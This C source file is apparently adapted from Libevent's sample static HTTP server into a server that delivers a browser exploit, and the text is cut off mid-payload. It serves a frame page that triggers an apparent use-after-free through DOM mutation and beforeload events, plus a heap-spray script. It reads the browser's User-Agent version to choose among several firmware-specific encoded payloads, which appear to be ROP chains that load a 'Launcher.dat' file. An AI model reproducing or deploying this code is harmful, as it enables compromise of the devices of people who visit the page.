/*
  A trivial static http webserver using Libevent's evhttp.

  This is not the best code in the world, and it does some fairly stupid stuff
  that you would never want to do in a production webserver. Caveat hackor!

 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <sys/types.h>
#include <sys/stat.h>

#ifdef WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <io.h>
#include <fcntl.h>
#ifndef S_ISDIR
#define S_ISDIR(x) (((x) & S_IFMT) == S_IFDIR)
#endif
#else
#include <sys/stat.h>
#include <sys/socket.h>
#include <signal.h>
#include <fcntl.h>
#include <unistd.h>
#include <dirent.h>
#endif

#include <event2/event.h>
#include <event2/http.h>
#include <event2/buffer.h>
#include <event2/util.h>
#include <event2/keyvalq_struct.h>

#ifdef _EVENT_HAVE_NETINET_IN_H
#include <netinet/in.h>
# ifdef _XOPEN_SOURCE_EXTENDED
#  include <arpa/inet.h>
# endif
#endif

/* Compatibility for possible missing IPv6 declarations */
#include "util-internal.h"

#ifdef WIN32
#define stat _stat
#define fstat _fstat
#define open _open
#define close _close
#define O_RDONLY _O_RDONLY
#endif

char uri_root[512];

static const struct table_entry {
	const char *extension;
	const char *content_type;
} content_type_table[] = {
	{ "txt", "text/plain" },
	{ "c", "text/plain" },
	{ "h", "text/plain" },
	{ "html", "text/html" },
	{ "htm", "text/htm" },
	{ "css", "text/css" },
	{ "gif", "image/gif" },
	{ "jpg", "image/jpeg" },
	{ "jpeg", "image/jpeg" },
	{ "png", "image/png" },
	{ "pdf", "application/pdf" },
	{ "ps", "application/postsript" },
	{ NULL, NULL },
};

/* Try to guess a good content-type for 'path' */
static const char *
guess_content_type(const char *path)
{
	const char *last_period, *extension;
	const struct table_entry *ent;
	last_period = strrchr(path, '.');
	if (!last_period || strchr(last_period, '/'))
		goto not_found; /* no exension */
	extension = last_period + 1;
	for (ent = &content_type_table[0]; ent->extension; ++ent) {
		if (!evutil_ascii_strcasecmp(ent->extension, extension))
			return ent->content_type;
	}

not_found:
	return "application/misc";
}

/* Callback used for the /dump URI, and for every non-GET request:
 * dumps all information to stdout and gives back a trivial 200 ok */
static void
dump_request_cb(struct evhttp_request *req, void *arg)
{
	const char *cmdtype;
	struct evkeyvalq *headers;
	struct evkeyval *header;
	struct evbuffer *buf;

	switch (evhttp_request_get_command(req)) {
	case EVHTTP_REQ_GET: cmdtype = "GET"; break;
	case EVHTTP_REQ_POST: cmdtype = "POST"; break;
	case EVHTTP_REQ_HEAD: cmdtype = "HEAD"; break;
	case EVHTTP_REQ_PUT: cmdtype = "PUT"; break;
	case EVHTTP_REQ_DELETE: cmdtype = "DELETE"; break;
	case EVHTTP_REQ_OPTIONS: cmdtype = "OPTIONS"; break;
	case EVHTTP_REQ_TRACE: cmdtype = "TRACE"; break;
	case EVHTTP_REQ_CONNECT: cmdtype = "CONNECT"; break;
	case EVHTTP_REQ_PATCH: cmdtype = "PATCH"; break;
	default: cmdtype = "unknown"; break;
	}

	printf("Received a %s request for %s\nHeaders:\n",
	    cmdtype, evhttp_request_get_uri(req));

	headers = evhttp_request_get_input_headers(req);
	for (header = headers->tqh_first; header;
	    header = header->next.tqe_next) {
		printf("  %s: %s\n", header->key, header->value);
	}

	buf = evhttp_request_get_input_buffer(req);
	puts("Input data: <<<");
	while (evbuffer_get_length(buf)) {
		int n;
		char cbuf[128];
		n = evbuffer_remove(buf, cbuf, sizeof(buf)-1);
		if (n > 0)
			(void) fwrite(cbuf, 1, n, stdout);
	}
	puts(">>>");

	evhttp_send_reply(req, 200, "OK", NULL);
}

/* This callback gets invoked when we get any http request that doesn't match
 * any other callback.  Like any evhttp server callback, it has a simple job:
 * it must eventually call evhttp_send_error() or evhttp_send_reply().
 */
static void
send_document_cb(struct evhttp_request *req, void *arg)
{
	struct evbuffer *evb = NULL;
	const char *uri = evhttp_request_get_uri(req);
	struct evhttp_uri *decoded = NULL;
	const char *path;
	char *decoded_path;
	size_t len;
	int fd = -1;
	struct stat st;
	struct evkeyvalq *headers;
	struct evkeyval *header;
	int fw = 0;
	const char *version;

	if (evhttp_request_get_command(req) != EVHTTP_REQ_GET) {
		dump_request_cb(req, arg);
		return;
	}

	printf("Got a GET request for <%s>\n",  uri);

	/* Decode the URI */
	decoded = evhttp_uri_parse(uri);
	if (!decoded) {
		printf("It's not a good URI. Sending BADREQUEST\n");
		evhttp_send_error(req, HTTP_BADREQUEST, 0);
		return;
	}

	/* Let's see what path the user asked for. */
	path = evhttp_uri_get_path(decoded);
	if (!path) path = "/";

	/* We need to decode it, to see what path the user really wanted. */
	decoded_path = evhttp_uridecode(path, 0, NULL);
	if (decoded_path == NULL)
		goto err;
	/* Don't allow any ".."s in the path, to avoid exposing stuff outside
	 * of the docroot.  This test is both overzealous and underzealous:
	 * it forbids aceptable paths like "/this/one..here", but it doesn't
	 * do anything to prevent symlink following." */
	if (strstr(decoded_path, ".."))
		goto err;

	/* This holds the content we're sending. */
	evb = evbuffer_new();

	if (strcmp(decoded_path, "/frame.html") == 0)
	{
		evbuffer_add_printf(evb,
			"<html>\n"
			"	<head>\n"
			"		<script>\n"
			"			var nb = 0;\n"
			"			function handleBeforeLoad() {\n"
			"				if (++nb == 1) {\n"
			"					p.addEventListener('DOMSubtreeModified', parent.dsm, false);\n"
			"				} else if (nb == 2) {\n"
			"					p.removeChild(f);\n"
			"				}\n"
			"			}\n"
			"			\n"
			"			function documentLoaded() {\n"
			"				f = window.frameElement;\n"
			"				p = f.parentNode;\n"
			"				var o = document.createElement(\"object\");\n"
			"				o.addEventListener('beforeload', handleBeforeLoad, false);\n"
			"				document.body.appendChild(o);\n"
			"			}\n"
			"\n"
			"			window.onload = documentLoaded;\n"
			"		</script>\n"
			"	</head>\n"
			"	<body>\n"
			"		KEKEKEKEK...\n"
			"	</body>\n"
			"</html>\n"
			);
	}
	else
	{
		evbuffer_add_printf(evb,
			"<html>\n"
			"<head>\n"
			"<style>\n"
			"	body {\n"
			"		color:white;\n"
			"		background:black;\n"
			"	}\n"
			"	\n"
			"	\n"
			"</style>\n"
			"<script>\n"
			"	function magicfun(mem, size, v) {\n"
			"		var a = new Array(size - 20);\n"
			"		nv = v + unescape(\"%%ucccc\");\n"
			"		for (var j = 0; j < a.length / (v.length / 4); j++) a[j] = nv;\n"
			"		var t = document.createTextNode(String.fromCharCode.apply(null, new Array(a)));\n"
			"\n"
			"		mem.push(t);\n"
			"	}\n"
			"\n"
			"	function dsm(evnt) {\n"
			"	    var mem = [];\n"
			"\n"
			"		for (var j = 20; j < 430; j++) {\n"
			);
		headers = evhttp_request_get_input_headers(req);
		for (header = headers->tqh_first; header;
			header = header->next.tqe_next) {
			printf("  %s: %s\n", header->key, header->value);
			if (strcmp(header->key, "User-Agent") == 0)
			{
				version = strstr(header->value, "Version/");
				if (version != NULL)
				{
					if (strncmp(version, "Version/1.7412", strlen("Version/1.7412")) == 0)
					{
						fw = 20;
					}
					else if (strncmp(version, "Version/1.7455", strlen("Version/1.7455")) == 0)
					{
						fw = 21;
					}
					else if (strncmp(version, "Version/1.7498", strlen("Version/1.7498")) == 0)
					{
						fw = 40;
					}
					else if (strncmp(version, "Version/1.7552", strlen("Version/1.7552")) == 0)
					{
						fw = 50;
					}
					else if (strncmp(version, "Version/1.7567", strlen("Version/1.7567")) == 0)
					{
						fw = 71;
					}
				}
			}
		}
		switch (fw)
		{
		case 20:
			evbuffer_add_printf(evb, "			magicfun(mem, j, unescape(\"\\ud8b4\\u0010\\ud8b4\\u0010\\ud8b4\\u0010\\ud8b4\\u0010\\uc058\\u002a\\u497f\\u002a\\u2ec0\\u0033\\u75f0\\u08b4\\u8008\\u0018\\ua00c\\u001d\\u68ff\\u0017\\u0000\\u08f1\\u7630\\u08b4\\u0001\\u0000\\ub020\\u0039\\uc01c\\u001c\\u6010\\u002c\\ub8b0\\u0025\\u1ff0\\u0023\\ubff0\\u002c\\u4000\\u0012\\udff4\\u0033\\ud8b4\\u0010\\uc058\\u002a\\ua000\\u0000\\ua124\\u0026\\u0004\\u08f1\\ufea0\\u0013\\uc024\\u001c\\u68ff\\u0017\\u0000\\u08f1\\u0020\\u08f1\\u1000\\u08f0\\u4000\\u0000\\u5ff8\\u0029\\u3ffc\\u0025\\ua3f4\\u002f\\ue030\\u002b\\u2010\\u0021\\u1f40\\u0027\\uc05c\\u0020\\ue0c4\\u002d\\u2000\\u001b\\uc058\\u002a\\u750c\\u08b4\\ua228\\u001c\\u57c4\\u0010\\ua124\\u0026\\u8281\\ud582\\u5898\\u0020\\udd48\\u0011\\ua124\\u0026\\u750c\\u08b4\\ufea0\\u0013\\u4850\\u0035\\uc058\\u002a\\u7618\\u08b4\\ua228\\u001c\\u7f6d\\u0012\\u0d24\\u0010\\u37e0\\u0010\\u748c\\u08b4\\u740c\\u08b4\\ua228\\u001c\\ubb00\\u0011\\ud8b4\\u0010\\ua124\\u0026\\u0000\\u0000\\u5898\\u0020\\u03a0\\u0013\\u3d3c\\u0010\\u1434\\u0010\\uff64\\u0022\\u03a0\\u0013\\u7400\\u08b4\\ud8b4\\u0010\\ud8b4\\u0010\\u0b5c\\u0010\\ufe44\\u0022\\ud8b4\\u0010\\ue63c\\u0017\\u57c4\\u0010\\u8af4\\u0022\\u0658\\u0035\\ud8b4\\u0010\\u8b93\\u0015\\uc058\\u002a\\u7618\\u08b4\\ua228\\u001c\\udd48\\u0011\\u9768\\u0011\\u6694\\u0010\\ua124\\u0026\\u0004\\u0000\\u5898\\u0020\\u0344\\u0013\\ua124\\u0026\\u7618\\u08b4\\ufea0\\u0013\\u0d24\\u0010\\ua124\\u0026\\ub000\\uf70f\\u5898\\u0020\\u9864\\u0011\\u29cc\\u001b\\u59c0\\u0020\\uc058\\u002a\\u7610\\u08b4\\ua124\\u0026\\u0ffc\\u08f0\\u9768\\u0011\\u5fd4\\u0035\\ua124\\u0026\\u74a8\\u08b4\\uc88c\\u0020\\u2215\\u002c\\ud8b4\\u0010\\ud8b4\\u0010\\u3d3c\\u0010\\u5654\\u002d\\u3778\\u0010\\ua864\\u002f\\u9b94\\u0011\\ue780\\u0020\\u8605\\u0012\\u3da8\\u0010\\u75f8\\u08b4\\ud8b4\\u0010\\ue63c\\u0017\\udf28\\u0010\\uc8e4\\u002f\\u37e0\\u0010\\uc494\\u0023\\u5254\\u002d\\u1000\\u08f0\\u5240\\u002d\\u7400\\u08b4\\ud8b4\\u0010\\ud8b4\\u0010\\u5240\\u002d\\u0064\\u006d\\u0063\\u003a\\u002f\\u004c\\u0061\\u0075\\u006e\\u0063\\u0068\\u0065\\u0072\\u002e\\u0064\\u0061\\u0074\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u5240\\u002d\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\"));\n");
			break;
		case 21:
			evbuffer_add_printf(evb, "			magicfun(mem, j, unescape(\"\\ud954\\u0010\\ud954\\u0010\\ud954\\u0010\\ud954\\u0010\\uc330\\u002a\\u4c57\\u002a\\u3334\\u0033\\u65f0\\u08b4\\u8008\\u0018\\ua00c\\u001d\\u6a27\\u0017\\u0000\\u08f1\\u6630\\u08b4\\u0001\\u0000\\ub020\\u0039\\uc01c\\u001c\\u6010\\u002c\\ubc04\\u0025\\u1ff0\\u0023\\ubff0\\u002c\\u4000\\u0012\\udff4\\u0033\\ud954\\u0010\\uc330\\u002a\\ue000\\u0000\\ua528\\u0026\\u0004\\u08f1\\uffc8\\u0013\\uc024\\u001c\\u6a27\\u0017\\u0000\\u08f1\\u0020\\u08f1\\u1000\\u08f0\\u4000\\u0000\\u5ff8\\u0029\\u3ffc\\u0025\\ua868\\u002f\\ue030\\u002b\\u2010\\u0021\\u1f40\\u0027\\uc05c\\u0020\\ue0c4\\u002d\\u2000\\u001b\\uc330\\u002a\\u650c\\u08b4\\ua350\\u001c\\u57c4\\u0010\\ua528\\u0026\\u8281\\ud582\\u59c0\\u0020\\udd48\\u0011\\ua528\\u0026\\u650c\\u08b4\\uffc8\\u0013\\u4850\\u0035\\uc330\\u002a\\u6618\\u08b4\\ua350\\u001c\\u7f6d\\u0012\\u0d24\\u0010\\u37e0\\u0010\\u648c\\u08b4\\u640c\\u08b4\\ua350\\u001c\\ubb00\\u0011\\ud954\\u0010\\ua528\\u0026\\u0000\\u0000\\u59c0\\u0020\\u03a0\\u0013\\u3d3c\\u0010\\u1434\\u0010\\uff64\\u0022\\u03a0\\u0013\\u6400\\u08b4\\ud954\\u0010\\ud954\\u0010\\u0b5c\\u0010\\ufe44\\u0022\\ud954\\u0010\\ue764\\u0017\\u57c4\\u0010\\u8af4\\u0022\\u0658\\u0035\\ud954\\u0010\\u8cbb\\u0015\\uc330\\u002a\\u6618\\u08b4\\ua350\\u001c\\udd48\\u0011\\u9864\\u0011\\u6694\\u0010\\ua528\\u0026\\u0004\\u0000\\u59c0\\u0020\\u0344\\u0013\\ua528\\u0026\\u6618\\u08b4\\uffc8\\u0013\\u0d24\\u0010\\ua528\\u0026\\ub000\\uf70f\\u59c0\\u0020\\u9864\\u0011\\u2af4\\u001b\\u59c0\\u0020\\uc330\\u002a\\u6610\\u08b4\\ua528\\u0026\\u0ffc\\u08f0\\u9864\\u0011\\u5fd4\\u0035\\ua528\\u0026\\u64a8\\u08b4\\uc9b4\\u0020\\u2215\\u002c\\ud954\\u0010\\ud954\\u0010\\u3d3c\\u0010\\u5654\\u002d\\u3778\\u0010\\ua864\\u002f\\u9b94\\u0011\\ue780\\u0020\\u8605\\u0012\\u3da8\\u0010\\u65f8\\u08b4\\ud954\\u0010\\ue764\\u0017\\udf28\\u0010\\uc8e4\\u002f\\u37e0\\u0010\\uc494\\u0023\\u5654\\u002d\\u1000\\u08f0\\u5640\\u002d\\u6400\\u08b4\\ud954\\u0010\\ud954\\u0010\\u5640\\u002d\\u0064\\u006d\\u0063\\u003a\\u002f\\u004c\\u0061\\u0075\\u006e\\u0063\\u0068\\u0065\\u0072\\u002e\\u0064\\u0061\\u0074\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u5640\\u002d\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\"));\n");
			break;
		case 40:
			evbuffer_add_printf(evb, "			magicfun(mem, j, unescape(\"\\udb6c\\u0010\\udb6c\\u0010\\udb6c\\u0010\\udb6c\\u0010\\ud574\\u002a\\u5f27\\u002a\\u2bec\\u0033\\u75f0\\u08b4\\u8008\\u0018\\ua00c\\u001d\\u943b\\u0017\\u0000\\u08f1\\u7630\\u08b4\\u0001\\u0000\\ub020\\u0039\\uc01c\\u001c\\u6010\\u002c\\ub0a8\\u0025\\u1ff0\\u0023\\ubff0\\u002c\\u4000\\u0012\\udff4\\u0033\\udb6c\\u0010\\ud574\\u002a\\u2000\\u0001\\u9758\\u0026\\u0004\\u08f1\\u0450\\u0014\\uc024\\u001c\\u943b\\u0017\\u0000\\u08f1\\u0020\\u08f1\\u1000\\u08f0\\u4000\\u0000\\u5ff8\\u0029\\u3ffc\\u0025\\uc8e8\\u002f\\ue030\\u002b\\u2010\\u0021\\u1f40\\u0027\\uc05c\\u0020\\ue0c4\\u002d\\u2000\\u001b\\ud574\\u002a\\u750c\\u08b4\\ucc64\\u001c\\u57c4\\u0010\\u9758\\u0026\\u8281\\ud582\\u7954\\u0020\\udd48\\u0011\\u9758\\u0026\\u750c\\u08b4\\u0450\\u0014\\u4850\\u0035\\ud574\\u002a\\u7618\\u08b4\\ucc64\\u001c\\u7f6d\\u0012\\u0d24\\u0010\\u37e0\\u0010\\u748c\\u08b4\\u740c\\u08b4\\ucc64\\u001c\\ubb00\\u0011\\udb6c\\u0010\\u9758\\u0026\\u0000\\u0000\\u7954\\u0020\\u03a0\\u0013\\u3da8\\u0010\\u1434\\u0010\\uff64\\u0022\\u03a0\\u0013\\u7400\\u08b4\\udb6c\\u0010\\udb6c\\u0010\\u0b5c\\u0010\\ufe44\\u0022\\udb6c\\u0010\\u114c\\u0018\\u57c4\\u0010\\u8af4\\u0022\\u0658\\u0035\\udb6c\\u0010\\u8de7\\u0015\\ud574\\u002a\\u7618\\u08b4\\ucc64\\u001c\\udd48\\u0011\\u9b94\\u0011\\u6694\\u0010\\u9758\\u0026\\u0004\\u0000\\u7954\\u0020\\u0344\\u0013\\u9758\\u0026\\u7618\\u08b4\\u0450\\u0014\\u0d24\\u0010\\u9758\\u0026\\ub000\\uf70f\\u7954\\u0020\\u9864\\u0011\\u560c\\u001b\\u59c0\\u0020\\ud574\\u002a\\u7610\\u08b4\\u9758\\u0026\\u0ffc\\u08f0\\u9b94\\u0011\\u5fd4\\u0035\\u9758\\u0026\\u74a8\\u08b4\\ue780\\u0020\\u2215\\u002c\\udb6c\\u0010\\udb6c\\u0010\\u3da8\\u0010\\u5654\\u002d\\u3778\\u0010\\ua864\\u002f\\u9b94\\u0011\\ue780\\u0020\\u8605\\u0012\\u3da8\\u0010\\u75f8\\u08b4\\udb6c\\u0010\\u114c\\u0018\\udf28\\u0010\\uc8e4\\u002f\\u37e0\\u0010\\uc494\\u0023\\u6a30\\u002d\\u1000\\u08f0\\u6a1c\\u002d\\u7400\\u08b4\\udb6c\\u0010\\udb6c\\u0010\\u6a1c\\u002d\\u0064\\u006d\\u0063\\u003a\\u002f\\u004c\\u0061\\u0075\\u006e\\u0063\\u0068\\u0065\\u0072\\u002e\\u0064\\u0061\\u0074\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u6a1c\\u002d\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\"));\n");
			break;
		case 50:
			evbuffer_add_printf(evb, "			magicfun(mem, j, unescape(\"\\u57e0\\u0010\\u57e0\\u0010\\u57e0\\u0010\\u57e0\\u0010\\uc320\\u0010\\u50cb\\u0010\\uca2c\\u0019\\u55f0\\u08b8\\u8008\\u0018\\ua00c\\u001d\\u46e3\\u0019\\u0000\\u08f1\\u5630\\u08b8\\u0001\\u0000\\ub020\\u0039\\uc01c\\u001c\\u6010\\u002c\\ufe48\\u0022\\u1ff0\\u0023\\ubff0\\u002c\\u4000\\u0012\\udff4\\u0033\\u57e0\\u0010\\uc320\\u0010\\u6000\\u0001\\u8b10\\u0022\\u0004\\u08f1\\u7350\\u0010\\uc024\\u001c\\u46e3\\u0019\\u0000\\u08f1\\u0020\\u08f1\\u1000\\u08f0\\u4000\\u0000\\u5ff8\\u0029\\u3ffc\\u0025\\u86c4\\u0016\\ue030\\u002b\\u2010\\u0021\\u1f40\\u0027\\uc05c\\u0020\\ue0c4\\u002d\\u2000\\u001b\\uc320\\u0010\\u550c\\u08b8\\ubb00\\u0011\\u57c4\\u0010\\u8b10\\u0022\\u8281\\ud582\\u0638\\u0035\\udd48\\u0011\\u8b10\\u0022\\u550c\\u08b8\\u7350\\u0010\\u4850\\u0035\\uc320\\u0010\\u5618\\u08b8\\ubb00\\u0011\\u7f6d\\u0012\\u014c\\u0010\\u37e0\\u0010\\u548c\\u08b8\\u540c\\u08b8\\ubb00\\u0011\\ubb00\\u0011\\u57e0\\u0010\\u8b10\\u0022\\u0000\\u0000\\u0638\\u0035\\u03a0\\u0013\\u65c4\\u0010\\u1434\\u0010\\uff64\\u0022\\u03a0\\u0013\\u5400\\u08b8\\u57e0\\u0010\\u57e0\\u0010\\u0b5c\\u0010\\ufe44\\u0022\\u57e0\\u0010\\u5ac0\\u002c\\u57c4\\u0010\\u8af4\\u0022\\u0658\\u0035\\u57e0\\u0010\\u2c87\\u0018\\uc320\\u0010\\u5618\\u08b8\\ubb00\\u0011\\udd48\\u0011\\u66b0\\u0010\\u6694\\u0010\\u8b10\\u0022\\u0004\\u0000\\u0638\\u0035\\u0344\\u0013\\u8b10\\u0022\\u5618\\u08b8\\u7350\\u0010\\u0d24\\u0010\\u8b10\\u0022\\ub000\\uf70f\\u0638\\u0035\\u9864\\u0011\\u1a50\\u0015\\u59c0\\u0020\\uc320\\u0010\\u5610\\u08b8\\u8b10\\u0022\\u0ffc\\u08f0\\u66b0\\u0010\\u5fd4\\u0035\\u8b10\\u0022\\u54a8\\u08b8\\ufc48\\u0010\\u2215\\u002c\\u57e0\\u0010\\u57e0\\u0010\\u65c4\\u0010\\u5654\\u002d\\u3778\\u0010\\ua864\\u002f\\u9b94\\u0011\\ue780\\u0020\\u8605\\u0012\\u3da8\\u0010\\u55f8\\u08b8\\u57e0\\u0010\\u5ac0\\u002c\\udf28\\u0010\\uc8e4\\u002f\\u37e0\\u0010\\uc494\\u0023\\u03a0\\u0013\\u1000\\u08f0\\u038c\\u0013\\u5400\\u08b8\\u57e0\\u0010\\u57e0\\u0010\\u038c\\u0013\\u0064\\u006d\\u0063\\u003a\\u002f\\u004c\\u0061\\u0075\\u006e\\u0063\\u0068\\u0065\\u0072\\u002e\\u0064\\u0061\\u0074\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u038c\\u0013\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\"));\n");
			break;
		case 71:
			evbuffer_add_printf(evb, "			magicfun(mem, j, unescape(\"\\u57c4\\u0010\\u57c4\\u0010\\u57c4\\u0010\\u57c4\\u0010\\uc2fc\\u0010\\u50b3\\u0010\\uca34\\u0019\\u85f0\\u08b8\\u8008\\u0018\\ua00c\\u001d\\u46eb\\u0019\\u0000\\u08f1\\u8630\\u08b8\\u0001\\u0000\\ub020\\u0039\\uc01c\\u001c\\u6010\\u002c\\ufe0c\\u0022\\u1ff0\\u0023\\ubff0\\u002c\\u4000\\u0012\\udff4\\u0033\\u57c4\\u0010\\uc2fc\\u0010\\ua000\\u0001\\u8af4\\u0022\\u0004\\u08f1\\u7334\\u0010\\uc024\\u001c\\u46eb\\u0019\\u0000\\u08f1\\u0020\\u08f1\\u1000\\u08f0\\u4000\\u0000\\u5ff8\\u0029\\u3ffc\\u0025\\u86e0\\u0016\\ue030\\u002b\\u2010\\u0021\\u1f40\\u0027\\uc05c\\u0020\\ue0c4\\u002d\\u2000\\u001b\\uc2fc\\u0010\\u850c\\u08b8\\ubacc\\u0011\\u57c4\\u0010\\u8af4\\u0022\\u8281\\ud582\\u0658\\u0035\\udd48\\u0011\\u8af4\\u0022\\u850c\\u08b8\\u7334\\u0010\\u4850\\u0035\\uc2fc\\u0010\\u8618\\u08b8\\ubacc\\u0011\\u7f6d\\u0012\\u014c\\u0010\\u37e0\\u0010\\u848c\\u08b8\\u840c\\u08b8\\ubacc\\u0011\\ubb00\\u0011\\u57c4\\u0010\\u8af4\\u0022\\u0000\\u0000\\u0658\\u0035\\u03a0\\u0013\\u65a8\\u0010\\u1434\\u0010\\uff64\\u0022\\u03a0\\u0013\\u8400\\u08b8\\u57c4\\u0010\\u57c4\\u0010\\u0b5c\\u0010\\ufe44\\u0022\\u57c4\\u0010\\u5ae0\\u002c\\u57c4\\u0010\\u8af4\\u0022\\u0658\\u0035\\u57c4\\u0010\\u2c93\\u0018\\uc2fc\\u0010\\u8618\\u08b8\\ubacc\\u0011\\udd48\\u0011\\u6694\\u0010\\u6694\\u0010\\u8af4\\u0022\\u0004\\u0000\\u0658\\u0035\\u0344\\u0013\\u8af4\\u0022\\u8618\\u08b8\\u7334\\u0010\\u0d24\\u0010\\u8af4\\u0022\\ub000\\uf70f\\u0658\\u0035\\u9864\\u0011\\u1a8c\\u0015\\u59c0\\u0020\\uc2fc\\u0010\\u8610\\u08b8\\u8af4\\u0022\\u0ffc\\u08f0\\u6694\\u0010\\u5fd4\\u0035\\u8af4\\u0022\\u84a8\\u08b8\\ufc24\\u0010\\u2215\\u002c\\u57c4\\u0010\\u57c4\\u0010\\u65a8\\u0010\\u5654\\u002d\\u3778\\u0010\\ua864\\u002f\\u9b94\\u0011\\ue780\\u0020\\u8605\\u0012\\u3da8\\u0010\\u85f8\\u08b8\\u57c4\\u0010\\u5ae0\\u002c\\udf28\\u0010\\uc8e4\\u002f\\u37e0\\u0010\\uc494\\u0023\\u0358\\u0013\\u1000\\u08f0\\u0344\\u0013\\u8400\\u08b8\\u57c4\\u0010\\u57c4\\u0010\\u0344\\u0013\\u0064\\u006d\\u0063\\u003a\\u002f\\u004c\\u0061\\u0075\\u006e\\u0063\\u0068\\u0065\\u0072\\u002e\\u0064\\u0061\\u0074\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0344\\u0013\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\"));\n");
			break;
		default:
			evbuffer_add_printf(evb, "			magicfun(mem, j, unescape(\"\\u0000\\u08e0\\u0004\\u08e0\\u0008\\u08e0\\u000c\\u08e0\\u0010\\u08e0\\u0014\\u08e0\\u0018\\u08e0\\u001c\\u08e0\\u0020\\u08e0\\u0024\\u08e0\\u0028\\u08e0\\u002c\\u08e0\\u0030\\u08e0\\u0034\\u08e0\\u0038\\u08e0\\u003c\\u08e0\\u0040\\u08e0\\u0044\\u08e0\\u0048\\u08e0\\u004c\\u08e0\\u0050\\u08e0\\u0054\\u08e0\\u0058\\u08e0\\u005c\\u08e0\\u0060\\u08e0\\u0064\\u08e0\\u0068\\u08e0\\u006c\\u08e0\\u0070\\u08e0\\u0074\\u08e0\\u0078\\u08e0\\u007c\\u08e0\\u0080\\u08e0\\u0084\\u08e0\\u0088\\u08e0\\u008c\\u08e0\\u0090\\u08e0\\u0094\\u08e0\\u0098\\u08e0\\u009c\\u08e0\\u00a0\\u08e0\\u00a4\\u08e0\\u00a8\\u08e0\\u00ac\\u08e0\\u00b0\\u08e0\\u00b4\\u08e0\\u00b8\\u08e0\\u00bc\\u08e0\\u00c0\\u08e0\\u00c4\\u08e0\\u00c8\\u08e0\\u00cc\\u08e0\\u00d0\\u08e0\\u00d4\\u08e0\\u00d8\\u08e0\\u00dc\\u08e0\\u00e0\\u08e0\\u00e4\\u08e0\\u00e8\\u08e0\\u00ec\\u08e0\\u00f0\\u08e0\\u00f4\\u08e0\\u00f8\\u08e0\\u00fc\\u08e0\\u0100\\u08e0\\u0104\\u08e0\\u0108\\u08e0\\u010c\\u08e0\\u0110\\u08e0\\u0114\\u08e0\\u0118\\u08e0\\u011c\\u08e0\\u0120\\u08e0\\u0124\\u08e0\\u0128\\u08e0\\u012c\\u08e0\\u0130\\u08e0\\u0134\\u08e0\\u01